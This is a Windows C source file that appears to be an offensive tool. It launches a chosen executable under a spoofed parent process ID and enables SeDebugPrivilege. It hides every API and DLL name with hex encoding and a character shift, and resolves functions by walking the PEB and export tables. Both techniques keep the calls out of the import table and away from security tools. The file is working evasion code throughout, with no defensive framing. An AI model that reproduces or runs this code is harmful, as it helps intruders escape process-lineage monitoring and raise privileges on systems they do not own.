#include <stdio.h>
#include <windows.h>
#include <string.h>

// Definition of UNICODE_STRING
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

// Definition of LDR_DATA_TABLE_ENTRY
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// Definition of PEB_LDR_DATA
typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

// Definition of PEB
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN Spare;
    PVOID Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// TEB (Thread Environment Block)
#ifdef _M_X64
__forceinline PPEB GetPEB() {
    return (PPEB)__readgsqword(0x60);  // On x64, PEB is at GS:0x60
}
#else
__forceinline PPEB GetPEB() {
    return (PPEB)__readfsdword(0x30);  // On x86, PEB is at FS:0x30
}
#endif

// Function to obfuscate data using character shifting
void shiftData(char *data, int shift) {
    size_t dataLength = strlen(data);

    for (size_t i = 0; i < dataLength; i++) {
        data[i] = data[i] - shift; // Shift character
    }
}

// Function to convert hex character to its decimal value
int hexCharToDec(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return -1;
}

// Function to convert hex string to ASCII
void hexToAscii(const char *hexStr, char *asciiStr) {
    size_t len = strlen(hexStr);
    if (len % 2 != 0) return;

    for (size_t i = 0; i < len; i += 2) {
        int highNibble = hexCharToDec(hexStr[i]);
        int lowNibble = hexCharToDec(hexStr[i + 1]);
        if (highNibble == -1 || lowNibble == -1) return;

        asciiStr[i / 2] = (highNibble << 4) | lowNibble;
    }
    asciiStr[len / 2] = '\0';
}

// Orchestrates Decryption
void decryptData(const char *encryptedData, char *decryptedData) {
    hexToAscii(encryptedData, decryptedData);
    shiftData(decryptedData, 3);
}

// Function to find a module's base address by name
static void* FindModuleBaseAddress(const wchar_t* moduleName) {
    PPEB peb = GetPEB();
    PPEB_LDR_DATA ldr = peb->Ldr;

    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* current = moduleList->Flink;

    while (current != moduleList) {
        PLDR_DATA_TABLE_ENTRY moduleEntry = (PLDR_DATA_TABLE_ENTRY)current;

        if (moduleEntry->BaseDllName.Buffer != NULL) {
            if (_wcsicmp(moduleEntry->BaseDllName.Buffer, moduleName) == 0) {
                return moduleEntry->DllBase;
            }
        }
        current = current->Flink;
    }
    return NULL;
}

// Function to resolve a function's address from a module
static void* ResolveFunctionAddress(void* moduleBase, const char* functionName) {
    if (!moduleBase) return NULL;

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)
        ((BYTE*)moduleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfNames);
    DWORD* functionRVAs = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfFunctions);
    WORD* nameOrdinals = (WORD*)((BYTE*)moduleBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* currentName = (char*)moduleBase + nameRVAs[i];
        if (strcmp(currentName, functionName) == 0) {
            return (void*)((BYTE*)moduleBase + functionRVAs[nameOrdinals[i]]);
        }
    }
    return NULL;
}

// High-level function to get a specific function from kernel32.dll
void* GetKernel32Function(const char* functionName) {
    void* kernel32Base = FindModuleBaseAddress(L"kernel32.dll");
    if (!kernel32Base) {
        return NULL;
    }
    return ResolveFunctionAddress(kernel32Base, functionName);
}

// Load a DLL and get the address of a function
void* loadLibraryAndFunction(const char* lpLibFileName, const char* lpProcName) {
    HMODULE (WINAPI *pLoadLibraryA)(
        LPCSTR lpLibFileName
        );
    FARPROC (WINAPI *pGetProcAddress)(
        HMODULE hModule,
        LPCSTR lpProcName
        );
    
    // Decode and decrypt function names
    char loadLibraryA[50];
    decryptData("4f7264674f6c657564757c44", loadLibraryA);

    char getProcAddress[50];
    decryptData("4a68775375726644676775687676", getProcAddress);

    // Get Kernel32 functions
    pLoadLibraryA = GetKernel32Function(loadLibraryA);
    pGetProcAddress = GetKernel32Function(getProcAddress);

    if (!pLoadLibraryA || !pGetProcAddress) {
        return NULL;
    }

    HMODULE hModule = pLoadLibraryA(lpLibFileName);
    if (hModule) {
        void* funcPtr = pGetProcAddress(hModule, lpProcName);
        return funcPtr;
    }
    return NULL;
}

// Function to enable a privilege
BOOL EnablePrivilege(LPCTSTR privilege) {

    BOOL (WINAPI *pLookupPrivilegeValueA)(
        LPCSTR lpSystemName,
        LPCSTR lpName,
        PLUID lpLuid
        );
    BOOL (WINAPI *pOpenProcessToken)(
        HANDLE ProcessHandle,
        DWORD DesiredAccess,
        PHANDLE TokenHandle
        );
    BOOL (WINAPI *pAdjustTokenPrivileges)(
        HANDLE TokenHandle,
        BOOL DisableAllPrivileges,
        PTOKEN_PRIVILEGES NewState,
        DWORD BufferLength,
        PTOKEN_PRIVILEGES PreviousState,
        PDWORD ReturnLength
        );
    BOOL (WINAPI *pCloseHandle)(
        HANDLE hObject
        );
    HANDLE (WINAPI *pGetCurrentProcess)(
        void
        );
    
    // Decode and decrypt dll names
    char advapi32[50];
    decryptData("64677964736c363531676f6f", advapi32);

    char kernel32[100];
    decryptData("6e687571686f363531676f6f", kernel32);
    
    // Decode and decrypt function names
    char lookupPrivilegeValueA[50];
    decryptData("4f72726e787353756c796c6f686a6859646f786844", lookupPrivilegeValueA);

    char openProcessToken[50];
    decryptData("527368715375726668767657726e6871", openProcessToken);

    char adjustTokenPrivileges[50];
    decryptData("44676d78767757726e687153756c796c6f686a6876", adjustTokenPrivileges);

    char closeHandle[100];
    decryptData("466f7276684b6471676f68", closeHandle);

    char getCurrentProcess[100];
    decryptData("4a68774678757568717753757266687676", getCurrentProcess);

    // Load functions
    pLookupPrivilegeValueA = loadLibraryAndFunction(advapi32, lookupPrivilegeValueA);
    pOpenProcessToken = loadLibraryAndFunction(advapi32, openProcessToken);
    pAdjustTokenPrivileges = loadLibraryAndFunction(advapi32, adjustTokenPrivileges);
    pCloseHandle = loadLibraryAndFunction(kernel32, closeHandle);
    pGetCurrentProcess = loadLibraryAndFunction(kernel32, getCurrentProcess);

    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!pLookupPrivilegeValueA(
            NULL,       // lpSystemName
            privilege,  // lpName
            &luid       // lpLuid
            )) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    HANDLE hToken;
    if (!pOpenProcessToken(
            pGetCurrentProcess(),        // ProcessHandle
            TOKEN_ADJUST_PRIVILEGES,    // DesiredAccess
            &hToken                     // TokenHandle
            )) {
        return FALSE;
    }

    if (!pAdjustTokenPrivileges(
            hToken,                     // TokenHandle
            FALSE,                      // DisableAllPrivileges
            &tp,                        // NewState
            sizeof(TOKEN_PRIVILEGES),   // BufferLength
            NULL,                       // PreviousState
            NULL                        // ReturnLength
            )) {
        pCloseHandle(hToken);
        return FALSE;
    }

    pCloseHandle(hToken);
    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <Parent PID> <Executable Path> <Arguments>\n", argv[0]);
        return FALSE;
    }

    DWORD parentPid = atoi(argv[1]);
    char *exePath = argv[2];
    char *arguments = argv[3];
    
    BOOL (WINAPI *pCloseHandle)(
        HANDLE hObject
        );
    HANDLE (WINAPI *pOpenProcess)(
        DWORD dwDesiredAccess,
        BOOL bInheritHandle,
        DWORD dwProcessI
        );
    BOOL (WINAPI *pInitializeProcThreadAttributeList)(
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        DWORD dwAttributeCount,
        DWORD dwFlags,
        PSIZE_T lpSize
        );
    BOOL (WINAPI *pUpdateProcThreadAttribute)(
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        DWORD dwFlags,
        DWORD_PTR Attribute,
        PVOID lpValue,
        SIZE_T cbSize,
        PVOID lpPreviousValue,
        PSIZE_T lpReturnSize
        );
    void (WINAPI *pDeleteProcThreadAttributeList)(
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList
        );
    BOOL (WINAPI *pCreateProcessA)(
        LPCSTR lpApplicationName,
        LPSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCSTR lpCurrentDirectory,
        LPSTARTUPINFOA lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        );

    // Decode and decrypt dll names
    char kernel32[100];
    decryptData("6e687571686f363531676f6f", kernel32);

    // Decode and decrypt function names
    char closeHandle[100];
    decryptData("466f7276684b6471676f68", closeHandle);

    char openProcess[100];
    decryptData("5273687153757266687676", openProcess);

    char initializeProcThreadAttributeList[100];
    decryptData("4c716c776c646f6c7d6853757266576b75686467447777756c657877684f6c7677", initializeProcThreadAttributeList);

    char updateProcThreadAttribute[100];
    decryptData("58736764776853757266576b75686467447777756c65787768", updateProcThreadAttribute);

    char deleteProcThreadAttributeList[100];
    decryptData("47686f68776853757266576b75686467447777756c657877684f6c7677", deleteProcThreadAttributeList);

    char createProcessA[100];
    decryptData("4675686477685375726668767644", createProcessA);

    // Load functions
    pCloseHandle = loadLibraryAndFunction(kernel32, closeHandle);
    pOpenProcess = loadLibraryAndFunction(kernel32, openProcess);
    pInitializeProcThreadAttributeList = loadLibraryAndFunction(kernel32, initializeProcThreadAttributeList);
    pUpdateProcThreadAttribute = loadLibraryAndFunction(kernel32, updateProcThreadAttribute);
    pDeleteProcThreadAttributeList = loadLibraryAndFunction(kernel32, deleteProcThreadAttributeList);
    pCreateProcessA = loadLibraryAndFunction(kernel32, createProcessA);

    if (!pOpenProcess || !pInitializeProcThreadAttributeList || !pUpdateProcThreadAttribute ||
            !pDeleteProcThreadAttributeList || !pCreateProcessA) { 
        return FALSE;
    }

    char seDebugPrivilege[50];
    decryptData("5668476865786a53756c796c6f686a68", seDebugPrivilege);
    
    // Enable the SeDebugPrivilege privilege
    if (!EnablePrivilege(seDebugPrivilege)) {
        printf("Failed to enable %s\n", seDebugPrivilege);
        return FALSE;
    }

    // Get a handle to the parent process
    HANDLE hParentProcess = pOpenProcess(
        PROCESS_CREATE_PROCESS,
        FALSE,
        parentPid
        );
    if (!hParentProcess) {
        return FALSE;
    }

    STARTUPINFOEXA si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attributeSize = 0;

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Initialize attribute list
    pInitializeProcThreadAttributeList(
        NULL,
        1,
        0,
        &attributeSize
        );
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attributeSize);
    if (!si.lpAttributeList) {
        pCloseHandle(hParentProcess);
        return 1;
    }

    if (!pInitializeProcThreadAttributeList(
            si.lpAttributeList,
            1,
            0,
            &attributeSize
            )) {
        free(si.lpAttributeList);
        pCloseHandle(hParentProcess);
        return 1;
    }

    // Set the parent process attribute
    if (!pUpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParentProcess,
            sizeof(HANDLE),
            NULL,
            NULL
            )) {
        pDeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        pCloseHandle(hParentProcess);
        return 1;
    }

    // Create the new process
    if (!pCreateProcessA(
            exePath,
            arguments,
            NULL,
            NULL,
            FALSE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si.StartupInfo,
            &pi
            )) {
        pDeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        pCloseHandle(hParentProcess);
        return 1;
    }

    printf("Process created successfully! PID: %lu\n", pi.dwProcessId);

    // Cleanup
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);
    pDeleteProcThreadAttributeList(si.lpAttributeList);
    free(si.lpAttributeList);
    pCloseHandle(hParentProcess);

    return TRUE;
}
